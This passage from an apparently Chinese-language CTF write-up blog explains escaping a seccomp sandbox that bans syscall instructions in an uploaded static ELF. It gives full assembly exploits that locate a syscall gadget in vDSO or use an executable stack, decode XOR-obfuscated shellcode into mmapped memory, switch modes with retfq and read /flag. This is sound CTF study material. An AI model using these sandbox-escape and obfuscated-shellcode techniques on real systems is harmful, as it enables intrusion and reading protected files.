class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>可以上传一个文件，但对文件进行了限制</p><ul><li>ban了 <strong>int 80</strong> 和 <strong>syscall</strong>，考虑了指令跨页的情况</li><li>ELF Header<ul><li>必须为动态 &#x2F; 静态链接可执行文件</li><li>ELF Header大小0x40</li><li>有段表且段表在ELF Header之后</li></ul></li><li>segments<ul><li>没有动态链接段和解释器信息（静态链接文件）</li><li>不能有wx段</li><li>不能有大于ELF大小的段</li></ul></li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>沙箱</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br><span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0014</span><br><span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br><span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x11</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000001</span>  <span class="hljs-keyword">if</span> (A == x32_write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000009</span>  <span class="hljs-keyword">if</span> (A == x32_mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x4000000b</span>  <span class="hljs-keyword">if</span> (A == x32_munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span><br><span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0010</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br><span class="hljs-number">0011</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00007fff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7fff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0012</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br><span class="hljs-number">0013</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x08</span> <span class="hljs-number">0xffffefe5</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0xffffefe5</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0015</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br><span class="hljs-number">0016</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> ; <span class="hljs-built_in">exit</span><br><span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000006</span>  <span class="hljs-keyword">if</span> (A == lstat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0021</span> ; close<br><span class="hljs-number">0018</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A != fstat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span> ; open<br><span class="hljs-number">0019</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = statbuf <span class="hljs-meta"># fstat(fd, statbuf)</span><br><span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0022</span><br><span class="hljs-number">0021</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br><span class="hljs-number">0022</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure><ul><li>64位：允许read，x32_write，x32_mmap</li><li>32位：允许open</li></ul><p><em>主要问题是怎么造syscall</em></p><h3 id="vdso"><a href="#vdso" class="headerlink" title="vdso"></a>vdso</h3><p>虽然只能加载静态链接ELF但vsdo还是会加载进内存，且rx权限的vdso中是有syscall的</p><p>先放ELF再慢慢解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; compile with: nasm -felf64 exp.s &amp;&amp; ld -N exp.o &amp;&amp; strip -s ./a.out<br>; ld -N will put all segment together (make file much smaller), <br>; but will create RWX segment<br>; use 010 editor to modify segment header, mark it as RX<br><br>global    _start<br>section   .text<br><br>_start:<br>    mov rdi, rsp<br>; find vdso address on stack<br>find_vdso_l1:<br>    cmp    QWORD [rdi],0x21<br>    je     find_vdso_l2<br>    add    rdi,0x8<br>    jmp    find_vdso_l1<br>find_vdso_l2: <br>    mov    rax, QWORD [rdi+0x8] ; rax store vdso ptr<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0xc3<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov r15, rax<br>mmap_32bit_stack:<br>    mov eax, 0x40000009<br>    mov edi, 0x19260000-0x1000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    call r15 ; call syscall<br>    ; mmap_x32(0x19260000-0x1000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>mmap_32bit_shellcode:<br>    mov eax, 0x40000009<br>    mov edi, 0x19290000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    call r15 ; call syscall<br>    ; mmap_x32(0x19290000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br><br>xor_shellcode_l1:<br>    xor    eax,eax<br>    lea    rdi,[sc]<br>    mov    rsi,0x19290000<br>    mov    rdx,QWORD [sc_len]<br>xor_shellcode_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_l2<br><br>jump_to_shellcode:<br>    mov rsp, 0x19260000<br>    mov rax, 0x19290000<br>    jmp rax<br><br>; message:  db        &quot;test output!!!!!&quot;, 0      ; note the newline at the end<br>sc:       db        0xbd, 0x1, 0x4, 0x27, 0x18, 0x6b, 0x22, 0x69, 0xf, 0x1, 0x28, 0x18, 0x49, 0xca, 0xb9, 0x4, 0x1, 0x1, 0x1, 0x6b, 0x66, 0x69, 0x2e, 0x67, 0x6d, 0x60, 0x88, 0xe2, 0x30, 0xc8, 0xcc, 0x81, 0x6b, 0x32, 0x69, 0x28, 0x1, 0x28, 0x18, 0x49, 0xca, 0x30, 0xc1, 0xbe, 0x2, 0x1, 0x1, 0x1, 0xbf, 0x1, 0x9, 0x27, 0x18, 0xbb, 0x1, 0x0, 0x1, 0x1, 0xe, 0x4, 0xb9, 0x0, 0x1, 0x1, 0x41, 0xbe, 0x0, 0x1, 0x1, 0x1, 0xbf, 0x1, 0x9, 0x27, 0x18, 0xbb, 0x1, 0x0, 0x1, 0x1, 0xe, 0x4, 0x6b, 0x22, 0x69, 0x5a, 0x1, 0x28, 0x18, 0x49, 0xca, 0xb9, 0x0, 0x1, 0x1, 0x1, 0xba, 0x88, 0x1, 0x1, 0x1, 0xcc, 0x81<br>sc_len:   dq        103<br></code></pre></td></tr></table></figure><ul><li><p>栈上会有vsdo的基址，在envp之后的auxv数组中，AT_SYSINFO_EHDR（0x21）项就是vdso的地址</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/stack.png" class title="stack"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vdso.png" class title="vdso"></li><li><p>然后就在vdso中搜索syscall</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/syscallret.png" class title="syscallret"></li><li><p>32位mmap一段内存，用作stack（0x40000000以上的系统调用号是64位下执行32位系统调用）</p><p>由于之后要转换成32位，需要栈高8字节为0，所以要重新mmap一段栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mmap_x32(<span class="hljs-number">0x19260000</span><span class="hljs-number">-0x1000</span>, <span class="hljs-number">0x2000</span>, RWX, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmap32.png" class title="mmap32 % } {% asset_img mmap1.png mmap1"></li><li><p>再mmap一段内存，用于写shellcode</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmap2.png" class title="mmap2"></li><li><p>将要执行的shellcode解码赋值至0x19290000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>    global _start<br><br>_start:<br>    ; mov eax, 0x40000009<br>    ; ; mov eax, 0x9<br>    ; mov edi, 0x19260000<br>    ; mov esi, 0x1000<br>    ; mov edx, 0x7<br>    ; mov r10d, 0x22<br>    ; mov r8d, -1<br>    ; mov r9d, 0<br>    ; syscall<br><br>    mov rsp, 0x19260500<br>    push 0x23 ; CS<br>    push 0x1929000e ; _open<br>    retfq<br><br>_open:<br>    mov eax, 5<br>    push 0x0067<br>    push 0x616c662f ; /flag<br>    mov ebx, esp<br>    xor ecx, ecx<br>    int 0x80<br><br>    push 0x33 ; CS<br>    push 0x19290029 ; _read<br>    retfq<br><br>_read:<br>    xor eax, eax<br>    mov rdi, 3<br>    mov rsi, 0x19260800<br>    mov rdx, 0x100<br>    syscall<br><br>_write:<br>    mov rax, 0x40000001<br>    mov rdi, 1<br>    mov rsi, 0x19260800<br>    mov rdx, 0x100<br>    syscall<br><br>    push 0x23 ; CS<br>    push 0x1929005b ; _exit<br>    retfq<br><br>_exit:<br>    mov eax, 1<br>    mov ebx, 137<br>    int 0x80<br></code></pre></td></tr></table></figure><ul><li><p>open需要32位</p><ul><li>可以使用retfq（相当于pop rip; pop cs;）切换架构（32位架构cs为0x23）</li><li>或者直接64位下直接int 0x80，需要保证栈和返回地址高32位为0</li><li><strong>注意int 0x80传参：ebx，ecx，edx，esi，edi</strong></li></ul><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open.png" class title="open"></li><li><p>然后正常64位read，x32_write</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/read.png" class title="read"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/write.png" class title="write"></li></ul></li></ul><h3 id="GNU-STACK"><a href="#GNU-STACK" class="headerlink" title="GNU_STACK"></a>GNU_STACK</h3><p>修改GNU_STACK p_flags 为X，栈默认可读写，由于内核实现原因此时栈是rwx的</p><p>分了三段shellcode</p><ul><li><p>shellcode1（exp）把shellcode2（sc_mmap）拷贝到栈上，解码并执行之</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global    _start<br>section   .text<br><br>_start:<br>    sub rsp,0x100<br>xor_shellcode_mmap_l1:<br>    xor    eax,eax<br>    lea    rdi,[sc_mmap]<br>    mov    rsi,rsp<br>    mov    rdx,QWORD [scm_len]<br>xor_shellcode_mmap_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_mmap_l2<br><br>jump_to_shellcode:<br>    jmp rsp<br><br>; message:  db        &quot;test output!!!!!&quot;, 0      ; note the newline at the end<br>sc:    db        185, 4, 1, 1, 1, 73, 191, 46, 103, 109, 96, 102, 1, 1, 1, 87, 136, 226, 48, 200, 204, 129, 48, 193, 190, 2, 1, 1, 1, 191, 1, 9, 39, 24, 187, 1, 0, 1, 1, 14, 4, 185, 0, 1, 1, 65, 190, 0, 1, 1, 1, 191, 1, 9, 39, 24, 187, 1, 0, 1, 1, 14, 4, 185, 0, 1, 1, 1, 186, 136, 1, 1, 1, 204, 129, 1, 47, 114, 105, 114, 117<br>sc_len:     dq        81<br>sc_mmap:    db        185, 8, 1, 1, 65, 190, 1, 241, 36, 24, 191, 1, 33, 1, 1, 187, 6, 1, 1, 1, 64, 187, 35, 1, 1, 1, 64, 185, 1, 1, 1, 1, 64, 184, 1, 1, 1, 1, 14, 4, 185, 8, 1, 1, 65, 190, 1, 1, 40, 24, 191, 1, 33, 1, 1, 187, 6, 1, 1, 1, 64, 187, 35, 1, 1, 1, 64, 185, 1, 1, 1, 1, 64, 184, 1, 1, 1, 1, 14, 4, 48, 193, 73, 140, 61, 36, 48, 17, 65, 1, 191, 1, 1, 40, 24, 187, 75, 1, 1, 1, 73, 56, 195, 117, 15, 139, 13, 6, 130, 240, 0, 137, 13, 7, 73, 254, 193, 234, 236, 189, 1, 1, 39, 24, 185, 1, 1, 40, 24, 254, 225, 1, 1, 1, 1, 1, 1<br>scm_len:    dq        137<br></code></pre></td></tr></table></figure><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/jmprsp.png" class title="jmprsp"><p>链接带stack的elf使用以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ld -o exp -z execstack exp.o<br></code></pre></td></tr></table></figure><p>这样的stack是rwx的，需要010editor改一下权限</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/editor.png" class title="editor"></li><li><p>shellcode2（sc_mmap）mmap两段内存，将shellcode3（sc）复制过去，执行之</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>    global _start<br><br>_start:<br>mmap_32bit_stack:<br>    mov eax, 0x40000009<br>    mov edi, 0x19260000-0x1000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    syscall ; call syscall<br>    ; mmap_x32(0x19260000-0x1000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>mmap_32bit_shellcode:<br>    mov eax, 0x40000009<br>    mov edi, 0x19290000<br>    mov esi, 0x2000<br>    mov edx, 7<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    syscall ; call syscall<br>    ; mmap_x32(0x19290000, 0x2000, RWX, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)<br>xor_shellcode_l1:<br>    xor    eax,eax<br>    lea    rdi,0x401031<br>    mov    rsi,0x19290000<br>    mov    rdx,80<br>xor_shellcode_l2:<br>    cmp    rdx,rax<br>    je     jump_to_shellcode<br>    mov    cl,BYTE [rdi+rax*1]<br>    xor    ecx,0x1<br>    mov    BYTE [rsi+rax*1],cl<br>    inc    rax<br>    jmp    xor_shellcode_l2<br><br>jump_to_shellcode:<br>    mov rsp, 0x19260000<br>    mov rax, 0x19290000<br>    jmp rax<br></code></pre></td></tr></table></figure><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/jmpshellcode.png" class title="jmpshellcode"></li><li><p>shellcode3（sc）进行orw</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">section .text<br>    global _start<br><br>_start:<br>_open:<br>    mov eax, <span class="hljs-number">5</span><br>    mov rsi, <span class="hljs-number">0x0067616c662f</span><br>    push rsi ; /flag<br>    mov ebx, esp<br>    xor ecx, ecx<br>    <span class="hljs-type">int</span> <span class="hljs-number">0x80</span><br><br>_read:<br>    xor eax, eax<br>    mov rdi, <span class="hljs-number">3</span><br>    mov rsi, <span class="hljs-number">0x19260800</span><br>    mov rdx, <span class="hljs-number">0x100</span><br>    syscall<br><br>_write:<br>    mov rax, <span class="hljs-number">0x40000001</span><br>    mov rdi, <span class="hljs-number">1</span><br>    mov rsi, <span class="hljs-number">0x19260800</span><br>    mov rdx, <span class="hljs-number">0x100</span><br>    syscall<br><br>_exit:<br>    mov eax, <span class="hljs-number">1</span><br>    mov ebx, <span class="hljs-number">137</span><br>    <span class="hljs-type">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure><p><strong>ps：vdso的shellcode写入flag字符串时是两个push，这是已经切换32位了，一次push是四字节，64位push两次就变成 &#x2F;fla 了(╯‵□′)╯︵┻━┻，就这个bug de了好久……</strong></p></li></ul><h1 id="2023-0CTF-nothing"><a href="#2023-0CTF-nothing" class="headerlink" title="2023 0CTF nothing"></a>2023 0CTF nothing</h1><h2 id="server-py-1"><a href="#server-py-1" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 